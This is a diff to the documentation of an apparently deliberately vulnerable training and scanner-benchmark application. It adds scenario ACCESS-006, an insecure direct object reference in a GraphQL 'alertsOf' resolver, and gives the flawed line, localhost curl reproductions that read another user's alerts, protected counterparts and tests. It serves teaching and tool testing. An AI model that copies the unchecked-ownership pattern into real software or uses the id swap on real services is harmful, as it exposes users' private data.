@@ -1,6 +1,20 @@
 # `ACCESS` — authorization
 
+5 scenarios: `ACCESS-001` in `accounts`, `ACCESS-003` in `accounts`, `ACCESS-004` in `accounts`, `ACCESS-005` in `accounts`, `ACCESS-006` in `notifications`.
+
+**In `accounts`.**
+
 Four weaknesses of the old clients' paths in `accounts`: an object read with no owner check, a role write with no role check, a profile route that takes the body as the change, and an internal route that believes a header. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults).
+
+**In `notifications`.**
+
+**Family:** `ACCESS` · **Service:** `notifications` · **Scanner:** SAST · **OWASP:** A01
+
+One query answers whichever user the argument names: the alerts of the
+service are read by id, with no check that the id is the caller's own. The
+two protected ways to read alerts take the user from the caller — one from
+the token, one from the entity the gateway already resolved for its own
+user, or an administrator's.
 
 ## ACCESS-001 — another account by identifier, with no ownership check
 
@@ -167,3 +181,95 @@ $ curl -s -o /dev/null -w '%{http_code}\n' "$RELAY/internal/users/lookup?email=a
 ### ACCESS-005 — tests
 
 `apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-005`: the header alone answers the administrator's profile; both counterparts answer 401 to the same headers.
+
+## ACCESS-006 — another user's alerts by id
+
+### ACCESS-006 — agent reference
+
+- **Scenario:** ACCESS-006, a user's object read by another user, by id.
+- **Source:** `apps/notifications/src/alerts/alerts-of.resolver.ts`
+- **Operation:** GraphQL `alertsOf(userId: ID!): [Alert!]!`, user.
+- **Sink:** `this.alerts.of(userId)` — the user is whichever the argument names, not the caller.
+- **Flow:** `userId = "u-bob"` in Alice's request → the repository's `findByUserId("u-bob")` → Bob's alerts answered to Alice.
+- **Counterparts:** `apps/notifications/src/alerts/alerts.resolver.ts` (`alerts`: the user comes from the token, and there is no `userId` argument), `apps/notifications/src/alerts/user-alerts.resolver.ts` (`User.alerts`: the caller's own user, or any user for an `ADMIN`).
+- **Tests:** `apps/notifications/test/scenarios/access.int-spec.ts`.
+- **Expected finding:** yes. A SAST tool must report an object-level read whose user comes from the request and is never compared with the caller.
+
+### ACCESS-006 — student guide
+
+The line (`apps/notifications/src/alerts/alerts-of.resolver.ts`):
+
+```ts
+return this.alerts.of(userId); // ACCESS-006 / CWE-639: the user is whichever the argument names, so one user's alerts are answered to another
+```
+
+The service's own way of reading alerts — `alerts` — never sees a user id:
+the guard puts the caller's id in the resolver, and the repository is asked
+for that id and no other. `alertsOf` takes the id as an argument, for a
+client that already knows whose alerts it wants, and hands it to the same
+repository unchanged. Authorization lives in the word "own": nothing about
+the token crosses into the query, so "Bob's alerts" and "alerts" are the
+same request to it. The id is not a secret — it is in every delivery and
+every federation representation — and knowing it is the whole attack. The
+author's belief: "a user asking for another user's alerts is only reading
+public markets."
+
+### ACCESS-006 — exploit lab
+
+Run on 2026-11-27 against the service alone on `127.0.0.1:3103`. `$A` is
+Alice's token; Bob's seeded alert is `ETH-USD BELOW 3000.00`:
+
+```console
+$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
+    -H "authorization: Bearer $A" \
+    -d '{"query":"query { alertsOf(userId: \"u-bob\") { userId symbol direction threshold label } }"}'
+{"data":{"alertsOf":[{"userId":"u-bob","symbol":"ETH-USD","direction":"BELOW","threshold":"3000.00","label":"Buy the dip"}]}}
+```
+
+Alice, named nowhere in the answer's data, is answered Bob's alert by
+naming his id. The same id through the counterparts:
+
+```console
+$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
+    -H "authorization: Bearer $A" -d '{"query":"{ alerts { userId symbol } }"}'
+{"data":{"alerts":[{"userId":"u-alice","symbol":"BTC-USD"}]}}
+
+$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
+    -H "authorization: Bearer $A" \
+    -d '{"query":"query($r: [_Any!]!) { _entities(representations: $r) { ... on User { alerts { userId symbol } } } }","variables":{"r":[{"__typename":"User","id":"u-bob"}]}}'
+{"errors":[{"message":"These fields are answered for the caller's own user, or by an administrator", … "extensions":{"code":"FORBIDDEN" …}}]}
+```
+
+her own list holds only hers, and the entity field refuses her on Bob's
+representation (Bob's own token and an administrator's are answered). In
+Postman: the request `ACCESS-006: another user's alerts by id`. In Burp:
+send the three queries from Repeater with Alice's token.
+
+### ACCESS-006 — vulnerable and protected
+
+| | Operation | What it does with the same id |
+| --- | --- | --- |
+| Vulnerable | `alertsOf` | Answers the alerts of the user the id names, to whoever asks |
+| Counterpart 1 | `alerts` | The user comes from the token; there is no `userId` argument to hand the id to (`GRAPHQL_VALIDATION_FAILED`) |
+| Counterpart 2 | `User.alerts` | The caller's own representation, or any for an `ADMIN`; Alice on Bob's is `FORBIDDEN` |
+
+**Scoped claim.** Each counterpart defeats this flaw for identical input:
+the id that reads Bob's alerts on the first cannot reach the repository
+through either of them — one has no argument for it, the other compares
+the representation's user with the caller. The claim is not that these two
+queries make the service's object-level access safe; only that this id
+reads no other user's alerts through them.
+
+### ACCESS-006 — tests
+
+`apps/notifications/test/scenarios/access.int-spec.ts`, describe
+`ACCESS-006: another user's alerts by id`. One attacker value — `u-bob`,
+in Alice's requests:
+
+- **The exploit:** `alertsOf` answers Bob's alert to Alice: his `userId`,
+  `symbol`, `direction` and `threshold`.
+- **Counterpart 1:** `alerts` answers only alerts whose `userId` is
+  Alice's, Bob's is absent, and a `userId` argument is refused
+  (`GRAPHQL_VALIDATION_FAILED`).
+- **Counterpart 2:** `User.alerts` answers `FORBIDDEN` for Alice on Bob's
+  representation, and answers Bob's own token and an administrator's.
